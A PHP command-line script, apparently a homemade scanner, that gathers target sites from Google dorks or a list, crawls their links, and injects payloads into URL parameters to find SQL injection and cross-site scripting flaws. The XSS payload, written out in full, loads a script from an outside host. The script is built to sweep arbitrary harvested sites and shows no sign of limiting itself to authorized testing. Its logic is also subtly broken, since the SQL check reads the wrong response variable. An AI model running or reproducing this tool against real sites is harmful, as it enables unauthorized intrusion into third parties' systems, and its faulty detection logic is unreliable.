<?php
error_reporting(E_ERROR | E_PARSE);
unlink("scanner.tmp");
function read_stdin()
{
        $fr=fopen("php://stdin","r");   
        $input = fgets($fr,128);        
        $input = rtrim($input);         
        fclose ($fr);                  
        return $input;                  
}
$choice = 1;
echo "\nMake a choice: \n 1- Scan a website (default) \n 2- Scan multiple websites \n 3- Use Google dork \n";
$choice = read_stdin();
if ($choice == 2) {
	echo "\nType list file name:";
	$lisfile = read_stdin();
	$temp = fopen("$lisfile", "r+");
}
elseif ($choice == 3) {
	echo "\nType your dork:";
	$dork = read_stdin();
	echo "\nNumber of pages to check:";
	$np = read_stdin();
	$temp = fopen("scanner.tmp", "a+");
	for ($n = 0; $n < $np + 1; $n++)
	{
		$google = "https://" . "www.google.fr/" . "#q=$dork&start=" . $n *10;
		//$google = urlencode($google);
		echo "\n $google \n";
			$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, $google);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0');
			$contentg = curl_exec($curl);
			curl_close($curl);
		//$contentg = file_get_contents($google);
		//echo "\n\n$contentg\n\n";
		$pattern = '#<a href="(.*?)"(.*?)>#is';
		$links;
		preg_match_all($pattern, $contentg, $links, PREG_PATTERN_ORDER);
		foreach ($links[1] as $lien)
		{
			$lien = strtok($lien, "/");
			echo $lien;
			fputs ($temp, "$lien\n");
		}
	}
	
	$tab = file("scanner.tmp");
	$tab = array_unique($tab);
	$row = "";
	$n = 0;
	foreach($tab as $k => $v){
	$row .= $v;
	$n ++;
	}
	ftruncate($temp, 0);
	fwrite($temp, $row);
	fclose($temp);
	$temp = fopen("scanner.tmp", "r+");
	echo "Going to scan $n sites \n";
}
else
{
	echo "\nType URL:";
	$temp = fopen("scanner.tmp", "a+");
	$singleURL = read_stdin();
	fputs($temp, $singleURL);
	fclose($temp);
	$temp = fopen("scanner.tmp", "r+");
}
echo "Choose accuracy (a number):";
$acy = read_stdin();
	while (!feof($temp))
		{
			$site = fgets($temp);
$count = 0;
$a = 0;
/*if ($choice != 2) {
$cookie[0] = "1";
label:str
		echo "Enter a cookie. Leave blank to stop entering coookies... \n";
		$cookie[$a] = read_stdin();
		$a ++;

		if ($cookie[$a] != "")
		{
			goto label;
		}	
}
$opts = array('http' => array('header'=> "Host: localhost\r\n" .
				  "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10\r\n" .'Cookie: ' . $cookie));
$context = stream_context_create($opts);*/
if (!strstr("$site", "http://") && !strstr($site, "https://"))
	{
		$site = "http://".$site;
	}
echo "SCANNING $site \n";
$content = file_get_contents($site);
$pattern = '#<a href="(.*?)"(.*?)>#is';
$links;
preg_match_all($pattern, $content, $links, PREG_PATTERN_ORDER);

$nom = preg_replace('#http://#siU','',$site) . ".txt";
//$nom = $site . ".txt";
echo "Saving site plan in $nom\n";
$fp = fopen("$nom", "a+");
echo "INITIALISATION... \n";
foreach ($links[1] as $lien)
{
	fputs ($fp, "$lien\n");
	if (!strstr("$lien", "http://") && !strstr($lien, "https://"))
	{
		$lien = $site."/".$lien;
	}
	//echo "$lien FOUND ";	
	$count ++;
}

fclose($fp);

$c = 0;
echo "SCANNING FILES";
while ($c < $acy)
{
echo ".";
$handle = fopen("$nom", "r+");
if ($handle)
{
	$i=1;
	if ($c > 0)
	{
		$i = $count;
	}
	fputs ($handle, "\n");
	while (!feof($handle))
	{
		echo ".";
		$buffer = fgets($handle, $i);
		
		if (!strstr("$buffer", "http://") && !strstr($buffer, "https://"))
		{
			$buffer = $site."/".$buffer;
		}
		//echo $buffer;
		$content = file_get_contents($buffer);
		$c++;
		preg_match_all($pattern, $content, $links, PREG_PATTERN_ORDER);
		foreach ($links[1] as $lien)
		{
			//echo "\n";
			if (!strstr("$lien", "http://") && !strstr($lien, "https://"))
			{
				$lien = $site."/".$lien;
			}
			//echo "$lien FOUND ";
			fputs ($handle, "$lien\n");
			$count ++;
		}
		$i++;
	}
	fclose($handle);
}
$c++;

}

echo "\n"."$count links FOUND"."\n";
echo "Deleting these that are same"."\n";
$tab = file($nom);
$tab = array_unique($tab);
$row = "";
foreach($tab as $k => $v){
$row .= $v;
}
$file = fopen($nom, "r+");
ftruncate($file, 0);
fwrite($file, $row);
fclose($file);
$fileContent = file_get_contents($nom);
$n = substr_count($fileContent, "\n");
echo "$n links FOUND !!"."\n";

echo "Now, let's scan for XSS and SQL flaws ! \n";

$handle = fopen("$nom", "r+");
while (!feof($handle))
	{
		$buffer = fgets($handle);

		if (strstr($buffer, "="))
		{
			echo ".";
			$urlsql = $buffer . urlencode("\'");
			$contentsql = file_get_contents($urlsql);
			if (strstr($content, "sql") or strstr($content, "SQL") or strstr($content, "Sql")) 
				{	
					echo "SQL FOUND !";
					$result = fopen("results.txt", "a+");
					fputs($result, "$urlsql \n");
					fclose($result);				
				}			
			$urlxss = explode("=", $buffer);
			//echo "\n $urlxss[0]";
			$urlxssr = $urlxss[0] . "=" . urlencode("\"/></script><script src=https://openbugbounty.org/1.js>");
			//echo "\n $urlxssr";
			$content = file_get_contents($urlxssr);
			/*$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, $urlxssr);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			$content = curl_exec($curl);
			curl_close($curl);*/

			if (strstr($content, "<script src=https://openbugbounty.org/1.js>")) 
				{	
					echo "XSS FOUND ! \n";
					$result = fopen("results.txt", "a+");
					fputs($result, "$urlxssr \n");
					fclose($result);				
				}
		}
	}
}
unlink("scanner.tmp");
echo "\nResults are in results.txt. If found nothing, try increasing accuracy. \n";
?>